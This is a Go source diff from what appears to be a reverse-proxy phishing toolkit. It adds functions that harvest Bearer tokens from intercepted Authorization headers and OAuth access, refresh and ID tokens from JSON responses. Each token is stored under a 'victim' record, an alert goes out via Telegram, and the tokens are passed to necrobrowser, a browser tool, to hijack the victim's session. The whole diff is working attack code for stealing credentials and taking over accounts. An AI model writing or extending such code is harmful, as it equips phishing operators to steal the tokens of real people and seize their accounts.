@@ -591,6 +591,127 @@ func (t *Trace) ExtractCredentialsFromResponseHeaders(response *http.Response) (
 	return found, nil
 }
 
+// ExtractBearerToken captures Authorization: Bearer tokens from outgoing requests.
+func (t *Trace) ExtractBearerToken(request *http.Request) (found bool, err error) {
+	cfg := t.Session.Config.Tracking.Tokens
+	if !cfg.Enabled || !cfg.CaptureBearer {
+		return
+	}
+
+	auth := request.Header.Get("Authorization")
+	if !strings.HasPrefix(auth, "Bearer ") {
+		return
+	}
+
+	value := strings.TrimPrefix(auth, "Bearer ")
+	if value == "" {
+		return
+	}
+
+	victim, err := t.GetVictim(t)
+	if err != nil || victim == nil {
+		return
+	}
+
+	vt := &db.VictimToken{
+		Type:  "bearer",
+		Value: value,
+		Time:  time.Now().UTC().Format("2006-01-02 15:04:05"),
+	}
+	if err = vt.Store(victim.ID); err != nil {
+		return
+	}
+
+	found = true
+	message := fmt.Sprintf("[%s] [+] bearer token captured", t.ID)
+	t.Info("%s: %s…", message, tui.Bold(tui.Red(value[:min(len(value), 20)])))
+	if tel := telegram.Self(t.Session); tel != nil {
+		tel.Send(message)
+	}
+	return
+}
+
+// ExtractTokens scans a response body for OAuth tokens (access_token, refresh_token, id_token, etc.)
+// as configured in [tracking.tokens].
+func (t *Trace) ExtractTokens(response *http.Response, body string) (found bool, err error) {
+	cfg := t.Session.Config.Tracking.Tokens
+	if !cfg.Enabled || len(cfg.Keys) == 0 {
+		return
+	}
+
+	// Path filter — only scan responses for configured paths (empty = scan all)
+	if len(cfg.Paths) > 0 {
+		matched := false
+		for _, p := range cfg.Paths {
+			if response.Request.URL.Path == p {
+				matched = true
+				break
+			}
+		}
+		if !matched {
+			return
+		}
+	}
+
+	// Only scan JSON responses
+	ct := strings.ToLower(response.Header.Get("Content-Type"))
+	if !strings.Contains(ct, "json") {
+		return
+	}
+
+	// Parse JSON — support both flat objects and nested {"data": {...}}
+	var data map[string]interface{}
+	if err = json.Unmarshal([]byte(body), &data); err != nil {
+		err = nil // non-fatal — body may not be JSON
+		return
+	}
+
+	victim, err := t.GetVictim(t)
+	if err != nil || victim == nil {
+		return
+	}
+
+	for _, key := range cfg.Keys {
+		val, ok := data[key]
+		if !ok {
+			continue
+		}
+		tokenStr, ok := val.(string)
+		if !ok || tokenStr == "" {
+			continue
+		}
+
+		vt := &db.VictimToken{
+			Type:  key,
+			Value: tokenStr,
+			Time:  time.Now().UTC().Format("2006-01-02 15:04:05"),
+		}
+		if storeErr := vt.Store(victim.ID); storeErr != nil {
+			t.Warning("failed to store token %s: %s", key, storeErr)
+			continue
+		}
+
+		found = true
+		preview := tokenStr
+		if len(preview) > 20 {
+			preview = preview[:20] + "…"
+		}
+		message := fmt.Sprintf("[%s] [+] token captured: %s", t.ID, tui.Bold(key))
+		t.Info("%s = %s", message, tui.Bold(tui.Red(preview)))
+		if tel := telegram.Self(t.Session); tel != nil {
+			tel.Send(message)
+		}
+	}
+	return
+}
+
+func min(a, b int) int {
+	if a < b {
+		return a
+	}
+	return b
+}
+
 // HijackSession If the request URL matches those defined in authSession in the config, then
 // pass the cookies in the CookieJar to necrobrowser to hijack the session
 func (t *Trace) HijackSession(request *http.Request) (err error) {
@@ -629,7 +750,7 @@ func (t *Trace) HijackSession(request *http.Request) (err error) {
 	} else {
 		nb, ok := m.(*necrobrowser.Necrobrowser)
 		if ok {
-			go nb.Instrument(victim.ID, victim.Cookies, string(creds))
+			go nb.Instrument(victim.ID, victim.Cookies, victim.Tokens, string(creds))
 		}
 	}
 
